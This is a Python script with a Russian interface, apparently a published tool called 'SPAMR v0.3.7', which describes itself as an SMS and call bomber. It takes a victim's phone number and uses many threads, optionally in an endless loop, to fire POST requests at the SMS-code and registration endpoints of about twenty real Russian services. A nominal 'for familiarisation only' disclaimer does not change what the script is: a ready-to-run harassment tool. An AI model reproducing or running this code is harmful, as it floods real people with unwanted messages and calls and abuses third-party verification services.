#!/usr/bin/python

# Внимание, кодеры! Обновление "0.3.7" было сделано на скорую руку и оно имеет ОГРОМНОЕ кол-во костылей. (Чуть позже будет обновление "0,3,7 FIX", в нём код станет хоть чуть-чуть опрятней и оно будет последнее). Спасибо за внимание!

import os
import random
import time
import sys
import threading

def logo():
    os.system("clear")
    print("\u001b[33m       ____  ____   _    __  __ ____      ")
    print("\u001b[33m      / ___||  _ \ / \  |  \/  |  _ \     ")
    print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")
    print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")
    print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
    print("\u001b[33m                   v0.3.7                 ")
    print("\u001b[33m                                          ")
    print("\u001b[95m     \u001b[32mSMS\u001b[95m & \u001b[32mCall bomber. \u001b[95mCTRL + Z\u001b[32m для выхода   ")
    print("                                                    ")
try:
    import requests
except:
    os.system("clear")
    logo()
    print("\u001b[33m[!] \u001b[31mБиблиотека 'REQUESTS' отсутствует, начинаю установку!\033[0m\n")
    time.sleep(2)
    os.system("clear")
    os.system("pip install requests")
    os.system('python ' + sys.argv[0])
try:
    from getch import pause
except:
    os.system("clear")
    logo()
    print("\u001b[33m[!] \u001b[31mБиблиотека 'GETCH' отсутствует, начинаю установку!\033[0m\n")
    time.sleep(2)
    os.system("clear")
    os.system("pip install py-getch")
    os.system('python3 ' + sys.argv[0])
try:
    from termcolor import colored
except:
    os.system("clear")
    logo()
    print("\u001b[33m[!] \u001b[31mБиблиотека 'TERMCOLOR' отсутствует, начинаю установку!\033[0m\n")
    time.sleep(2)
    os.system("clear")
    os.system("pip install termcolor")
    os.system('python3 ' + sys.argv[0])
try:
    from alive_progress import alive_bar
except:
    os.system("clear")
    logo()
    print("\u001b[33m[!] \u001b[31mБиблиотека 'ALIVE_PROGRESS' отсутствует, начинаю установку!\033[0m\n")
    time.sleep(2)
    os.system("clear")
    os.system("pip install alive_progress")
    os.system('python3 ' + sys.argv[0])

def connected_to_internet(url='http://www.google.com/', timeout=5):
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        logo()
        print("\u001b[33m[!] \u001b[31mОтсутствует интернет-соединение.\033[0m\n")
        time.sleep(2)
        os.system('python3 ' + sys.argv[0])
    return False

def delay():
    time.sleep(_delay)

def clear():
    os.system("clear")

name = ""
atack4 = "0"
atack3 = "0"
atack2 = "0"
atack1 = "1"
RealEndThreads = 0
RealThreads = 0
_phone = "0"
_delay = "0"
name = name + random.choice(
    list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
)
password = name + random.choice(
    list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
)
email = "{}@gmail.com".format(name)

logo()
print("\u001b[41m\u001b[32mМЕНЮ\u001b[49m:\n\u001b[33m[1]\u001b[32m SMS BOMBER.\n\u001b[33m[2]\u001b[32m ОБНОВИТЬ SPAMR.\n\u001b[33m[3]\u001b[32m О ПРОГРАММЕ.\n")
menu = input("\u001b[33mВведите номер пункта: \033[0m")

if menu == "1" or menu == "2" or menu == "3":
    pass
else:
    os.system('python3 ' + sys.argv[0])
if menu == "2":
    logo()
    print("\u001b[33m[+] \u001b[32mПроверка вашего интернет-соединения...\033[0m ")
    connected_to_internet()
    logo()
    up = input("\u001b[33m[!] \u001b[32mВы точно хотите обновить программу? (\u001b[95my\u001b[33m/\u001b[95mn\u001b[33m): \033[0m")

    if up == "y":
        pass
    else:
        clear()
        logo()
        os.system('python3 ' + sys.argv[0])
    if up == "y":
        clear()
        logo()
        print("\u001b[33m[+] \u001b[32mНачинаю обновление!\033[0m\n")
        time.sleep(1)
        clear()
    items = range(1)
    with alive_bar(len(items)) as bar:
        for item in items:
            os.system("cd && rm -rf spamr && git clone https://github.com/kirill2281337227/spamr")
            bar()
    clear()
    logo()
    print("\u001b[33m[+] \u001b[32mОбновление завершено!\n\033[0m")
    sys.exit()
    exit()
    exit()
    exit()

if menu == "3":
    logo()
    print("\u001b[33mИНФОРМАЦИЯ:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.7.\u001b[33m\nКОНТАКТЫ:\n\u001b[34m  Telegram:\u001b[95m @BreadToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mДанная программа создана ТОЛЬКО для ознакомления!\nАвтор данной программы не несет НИКАКОЙ ответственности за ваши действия!\n\n\u001b[33m\u001b[32mУдачи.\u001b[95m :D\n\033[0m ")
    pause()
    os.system('python3 ' + sys.argv[0])

if menu == "1":
    atack1 = "0"
    logo()
    print("\u001b[33m[+] \u001b[32mПроверка вашего интернет-соединения...\033[0m ")
    connected_to_internet()
    logo()
    _phone = input("\u001b[31mВведите номер. \u001b[33mПример: 79991112233\u001b[31m:\033[0m ")
    _phone9 = _phone[1:]


    if len(_phone) == 11 or len(_phone) == 12 or len(_phone) == 13:
        pass
    else:
        logo()
        print("\u001b[33m[!] \u001b[31mНомер указан не верно!\n\033[0m")
        time.sleep(1)
        os.system('python3 ' + sys.argv[0])

# Я знаю, что "attack" пишется с двумя "t"!

def atack():
    atack1 = "1"
    try:
        a  = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass

    try:
        a  = requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass

    try:
        a  = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", json={"phone": "+" + _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}).json()["res"]
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://rutube.ru/api/accounts/sendpass/phone", data={"phone": "+"+_phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://client-api.sushi-master.ru/api/v1/auth/init", json={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://ng-api.webbankir.com/user/v2/create", json={"lastName": "иванов", "firstName": "иван", "middleName": "иванович", "mobilePhone": _phone, "email": email, "smsCode": ""})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data="+" + _phone)
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://www.citilink.ru/registration/confirm/phone/+{_phone}/")
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://msk.tele2.ru/api/validation/number/"+_phone, json={"sender": "Tele2"},)
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+_phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
        delay()
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://api.mtstv.ru/v1/users", data={"msisdn":  _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://my.telegram.org/auth/send_password",data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://nn-card.ru/api/1.0/covid/login",data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://moscow.rutaxi.ru/ajax_keycode.html",data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    try:
        a = requests.post("https://api.iconjob.co/api/auth/verification_code",data={"phone": _phone})
        print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
    except:
        print("\u001b[33m[!] \u001b[31mОшибка отправки запроса!")
        pass
    global RealEndThreads
    RealEndThreads = RealEndThreads + 1
    if RealEndThreads >= _threads:
        if krug == "y":
            time.sleep(1)
            print("\u001b[33m[+] \u001b[32mПерезапускаю атаку!")
            time.sleep(1)
            atack()
        else:
            atackstop()
    else:
        pass



def atackstop():
    time.sleep(2)
    logo()
    print("\u001b[33m[+]\u001b[32m Атака завершена!\n")
    time.sleep(2)
    os.system('python3 ' + sys.argv[0])


if atack1 == "0":
    try:
        _delay = int(input("\u001b[31mВведите задержку. \u001b[33mВ секундах\u001b[31m:\033[0m "))
        atack4 = "1"
    except:
        logo()
        print("\u001b[33m[!] \u001b[31mЗадержка указана некорректно!\033[0m\n")
        time.sleep(1)
        os.system('python3 ' + sys.argv[0])

if atack4 == "1":
    try:
        _threads = int(input("\u001b[33mВведите кол-во потоков: \u001b[31m:\033[0m "))
        atack3 = "1"
    except:
        logo()
        print("\u001b[33m[!] \u001b[31mКол-во потоков введено некорректно!\033[0m\n")
        time.sleep(1)
        os.system('python3 ' + sys.argv[0])

if atack3 == "1":
    try:
        krug = input("\u001b[31mПерезапускать после завершения? (\u001b[33my\u001b[31m/\u001b[33mn\u001b[31m): \033[0m")
        clear()
        logo()
        atack2 = "1"
    except:
        logo()
        print("\u001b[33m[!] \u001b[31mДанные введены некорректно!\033[0m\n")
        time.sleep(1)
        os.system('python3 ' + sys.argv[0])

def ThreadsAdding():
    global RealThreads
    if RealThreads < _threads:
        threading.Thread(target=atack).start()
        RealThreads = RealThreads + 1
        try:
            ThreadsAdding()
        except:
            pass
    else:
        atack2 = "0"
    try:
        pass
    except:
        clear()
        logo()
        print("\u001b[33m[!]\u001b[31m Атака остановлена. Не удалось начать атаку!\033[0m\n")
        pause()
        os.system('python3 ' + sys.argv[0])

if atack2 == "1":
    ThreadsAdding()
